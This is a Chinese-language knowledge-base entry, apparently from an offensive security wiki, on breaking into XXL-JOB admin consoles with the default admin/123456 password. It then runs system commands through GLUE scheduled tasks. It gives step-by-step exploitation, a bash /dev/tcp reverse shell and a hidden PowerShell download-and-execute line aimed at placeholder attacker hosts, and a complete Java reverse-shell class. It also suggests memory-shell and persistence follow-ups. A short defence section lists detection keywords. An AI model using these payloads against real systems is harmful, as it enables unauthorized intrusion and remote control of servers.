---
id: web-java-component-xxl-job-admin-default-password-glue-task-rce
title: XXL-JOB admin 默认口令 admin/123456 登录：GLUE 计划任务跨平台命令执行与 executor 出网排查
type: scenario
domain: web
path: web/java/component
technique: xxl-job-admin-default-credential-glue-task-rce
tags:
- java
- xxl-job
- scheduler
- default-credentials
- rce
- glue
- powershell
- reverse-shell
- docker
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V520
  verified_at: '2026-11-11T13:17:40+08:00'
  notes: 已对照原文及12张截图核对：admin/123456+SQL初始化默认口令且不提示改密、任务管理新增 GLUE 任务、运行模式下拉 BEAN/GLUE(Java/Shell/Python/PHP/Nodejs/PowerShell)(图01/04)、操作菜单执行一次(图02/03)、WSL execve /bin/bash failed 2 与 script exit value(1) is failed(图05)、执行器管理自动注册/OnLine机器地址(图06) 均与原文一致；Java 跨平台反弹代码为原文精简。原文未给 XXL-JOB 受影响版本，affected_versions 保持空正确。与既有 executor 9999 直连卡入口不同（admin 默认口令登录 vs 直连），非重复；与 JumpServer 默认口令卡不同产品。未验证点：未登录真实 XXL-JOB 复测。
url: /docs/web/java/component/web-java-component-xxl-job-admin-default-password-glue-task-rce/
draft: false
kb_aliases:
- XXL-JOB 默认口令
- xxl-job admin/123456
- xxl-job 计划任务命令执行
- GLUE IDE 命令执行
- xxl-job 反弹 shell
- xxl-job executor 不出网
---

## 一句话结论

XXL-JOB 初始化 SQL 内置默认管理员 `admin/123456` 且登录后不提示修改；攻击者用默认口令登录调度中心（默认 8080/xxl-job-admin）后，新建 GLUE 任务并在 GLUE IDE 中写入 shell/PowerShell/Groovy 脚本、点击“执行一次”，即可借 executor 的执行能力获得系统命令执行（实战中多为反弹 shell）。踩坑点在于 executor 可能跑在 Windows 而不是惯性预期的 Linux docker 中，以及 executor 不出网导致反弹失败。

## 原理

- **默认凭据来源**：xxl-job 官方初始化 SQL 的 `xxl_job_user` 表预置 `admin` 用户，口令为 `123456` 的 MD5（`e10adc3949ba59abbe56e057f20f883e`），登录后系统不强制修改，因此大量实例可直接用 `admin/123456` 进入后台。
- **任务调度即命令执行**：XXL-JOB 的“运行模式”包含 `GLUE(Java)`、`GLUE(Shell)`、`GLUE(Python)`、`GLUE(PHP)`、`GLUE(Nodejs)`、`GLUE(PowerShell)`。选择 GLUE 模式后可在后台 GLUE IDE 编辑脚本，保存后“执行一次”，admin 会把脚本下发给 executor 落盘执行（executor 侧路径形如 `/data/applogs/xxl-job/jobhandler/gluesource/<id>_<时间戳>.sh`）。这是组件正常功能被滥用，不需要漏洞。
- **系统不匹配的踩坑**：executor 常部署在 Linux docker，但也会跑在 Windows。Linux 的 `/bin/bash` 脚本在 Windows executor 上执行会失败，执行日志出现 `<3>WSL ... execve /bin/bash failed 2`、`script exit value(1) is failed`——很多人误判为“环境打不动”。此时应改用 `GLUE(PowerShell)`（如 PowerShell 下载并执行上线马），或直接用 `GLUE(Java)` 写跨平台 Java 反弹 shell。
- **Java 跨平台反弹**：GLUE(Java) 中可写一个 `Socket` + `Runtime.getRuntime().exec("/bin/sh" 或 "cmd.exe")` 的三线程转发类（标准输入/输出/错误各一个 `StreamConnector`），同时适配 Windows/Linux，无需关心目标 shell 类型。
- **executor 不出网**：反弹不回连时，先到“执行器管理”看注册方式——自动注册的 executor 每 2 分钟向 admin 心跳，一般在线可用；手动注册的地址可能失效或指向不可达 IP，需要按实际网络确认，而不是重复换 payload。

## 触发条件

- 目标 XXL-JOB admin 控制台（默认 8080，路径 `/xxl-job-admin`）可从攻击者网络访问。
- 管理员口令仍为初始化默认值 `admin/123456`（或弱口令/已破解的 MD5）。
- 至少存在一个已注册且在线、可执行任务的 executor；GLUE 模式未被禁用。
- executor 有命令执行权限且（若反弹）能出网访问攻击者；不出网时可换正向/内存马等后续手段。

## 利用步骤

1. 访问 `http://target:8080/xxl-job-admin`，用 `admin/123456` 登录。
2. 任务管理 → 新增：填写执行器、负责人、CRON 调度类型与表达式。
3. 运行模式选择 `GLUE(Shell)`（Linux）或 `GLUE(PowerShell)`（Windows）；若不确定目标系统，选 `GLUE(Java)` 用跨平台代码。
4. 在 GLUE IDE 写入命令（验证可用 `id`/`whoami` 落日志，或直接反弹 shell）。
5. 保存后点“执行一次”，在调度日志/执行日志查看结果；失败时先核对 OS 类型与脚本语言是否匹配。
6. 若反弹未回连，到执行器管理检查注册方式与 `OnLine 机器地址`，确认 executor 出网情况后改用其他通道。

## PoC

GLUE(Shell) 验证/反弹：

```bash
id
bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1
```

GLUE(PowerShell)（Windows executor）：

```powershell
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/a.ps1')"
```

GLUE(Java) 跨平台反弹 shell（精简自原文，原理为 Socket 与本地 shell 的三向流对接）：

```java
package com.xxl.job.service.handler;

import java.io.*;
import java.net.Socket;

public class Reverse {
    public Reverse() { reverseConn("<attacker-ip>:<port>"); }

    public void reverseConn(String ipport) {
        try {
            String shell = System.getProperty("os.name").toLowerCase().contains("windows")
                    ? "cmd.exe" : "/bin/sh";
            Socket socket = new Socket(ipport.split(":")[0], Integer.parseInt(ipport.split(":")[1]));
            Process process = Runtime.getRuntime().exec(shell);
            new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
            new StreamConnector(process.getErrorStream(), socket.getOutputStream()).start();
            new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
        } catch (Exception e) { e.printStackTrace(); }
    }

    static class StreamConnector extends Thread {
        InputStream in; OutputStream out;
        StreamConnector(InputStream in, OutputStream out) { this.in = in; this.out = out; }
        public void run() {
            try {
                byte[] buf = new byte[8192]; int len;
                while ((len = in.read(buf)) > 0) { out.write(buf, 0, len); out.flush(); }
            } catch (Exception ignored) {}
        }
    }
}
```

原文截图中 executor 为 Windows（WSL 报错 `execve /bin/bash failed`），说明仅用 GLUE(Shell) 会失败；切换 PowerShell/Java 后可用。

## 变体与关联

- **凭据来源变体**：从泄露的数据库读取 `xxl_job_user` 的 MD5 口令（默认即 `123456`），解密或替换后登录，见 [[web-java-component-xxl-job-db-insert-cron-job-rce]]。
- **直连 executor**：不登录 admin，直接打 executor 9999 的 `/run`（无 token 或默认 token），见 [[web-java-component-xxl-job-executor-unauth-run-glue-rce]] 与 [[web-java-component-xxl-job-executor-run-default-token-rce]]。
- **执行后利用**：拿到命令执行后注入 Jetty Handler 内存马（见 [[web-java-component-xxl-job-executor-jetty-handler-collection-memshell]]）、写 crontab/systemd 持久化。
- **同类"任务调度系统即代码执行"**：PowerJob 等同类调度组件缺省权限问题（见 [[web-generic-auth-powerjob-missing-apipermission-unauth-endpoints]]）。

## 检测与防御

- **改默认口令**：安装后立即修改 `xxl_job_user` 中 admin 的口令（强口令），并禁用/删除无用账号。
- **收敛暴露面**：admin 控制台（8080）不对公网开放，置于内网/VPN 后；executor 9999 仅允许调度中心访问。
- **审计与告警**：监控“新增 GLUE 任务 + 立即执行一次”的组合行为、GLUE 脚本内容中出现 `bash -i`、`/dev/tcp`、`powershell -c`、`Runtime.getRuntime` 等关键字；关注非管理员时段的任务创建。
- **执行日志**：定期检查 executor 的 `gluesource` 目录与执行日志中的异常脚本、WSL/bash 报错后的 PowerShell 执行记录。
- **网络**：限制 executor 出站，尤其是直连非常规端口的 TCP 会话。
